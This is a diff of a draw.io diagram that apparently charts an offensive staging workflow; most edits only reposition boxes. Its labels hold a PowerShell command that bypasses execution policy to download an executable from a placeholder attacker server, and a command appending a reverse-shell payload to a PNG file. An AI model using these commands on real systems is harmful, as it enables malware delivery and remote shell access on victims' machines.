@@ -1,4 +1,4 @@
-<mxfile host="app.diagrams.net" modified="2022-12-22T22:10:38.749Z" agent="5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" etag="NRQadewCK5WJ0mn2IlCI" version="20.2.2" type="github">
+<mxfile host="app.diagrams.net" modified="2022-12-22T22:10:54.893Z" agent="5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" etag="3YG50lXhpnF7iR5UHz6Y" version="20.2.2" type="github">
   <diagram id="C5RBs43oDa-KdzZeNtuy" name="Page-1">
     <mxGraphModel dx="1659" dy="689" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
       <root>
@@ -44,10 +44,10 @@
           <mxGeometry x="490" y="240" width="120" height="30" as="geometry" />
         </mxCell>
         <mxCell id="G-sO2mh2Iyi2BEA4O4LV-5" value="Download staged binaries and png&#39;s to Medium IL Tools directory." style="rounded=1;whiteSpace=wrap;html=1;fontSize=12;glass=0;strokeWidth=1;shadow=0;fillColor=#00CC00;" vertex="1" parent="WIyWlLk6GJQsqaUBKTNV-1">
-          <mxGeometry x="610" y="500" width="120" height="80" as="geometry" />
+          <mxGeometry x="665" y="485" width="120" height="80" as="geometry" />
         </mxCell>
         <mxCell id="G-sO2mh2Iyi2BEA4O4LV-7" value="powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -c &quot;IEX(New-Object Net.WebClient).downloadFile(&#39;http://[IP]:[web server port]/Pers_Medium.exe&#39;,&#39;C:\Path\file.ext&#39;)&quot;" style="shape=document;whiteSpace=wrap;html=1;boundedLbl=1;fillColor=#00CC00;" vertex="1" parent="WIyWlLk6GJQsqaUBKTNV-1">
-          <mxGeometry x="960" y="450" width="570" height="50" as="geometry" />
+          <mxGeometry x="800" y="500" width="570" height="50" as="geometry" />
         </mxCell>
         <mxCell id="G-sO2mh2Iyi2BEA4O4LV-15" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="WIyWlLk6GJQsqaUBKTNV-1" source="G-sO2mh2Iyi2BEA4O4LV-14" target="WIyWlLk6GJQsqaUBKTNV-6">
           <mxGeometry relative="1" as="geometry" />
@@ -96,6 +96,9 @@
         </mxCell>
         <mxCell id="G-sO2mh2Iyi2BEA4O4LV-38" value="cp original.png combined.png; cat payload_reverse_shell_port#.raw &amp;gt;&amp;gt; combined.png" style="shape=document;whiteSpace=wrap;html=1;boundedLbl=1;fillColor=#FF6666;" vertex="1" parent="WIyWlLk6GJQsqaUBKTNV-1">
           <mxGeometry x="930" y="240" width="290" height="50" as="geometry" />
+        </mxCell>
+        <mxCell id="G-sO2mh2Iyi2BEA4O4LV-57" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="WIyWlLk6GJQsqaUBKTNV-1" source="G-sO2mh2Iyi2BEA4O4LV-49" target="G-sO2mh2Iyi2BEA4O4LV-5">
+          <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <mxCell id="G-sO2mh2Iyi2BEA4O4LV-49" value="Stage" style="swimlane;shadow=0;fillColor=#FF6666;" vertex="1" parent="WIyWlLk6GJQsqaUBKTNV-1">
           <mxGeometry x="380" y="340" width="690" height="110" as="geometry" />
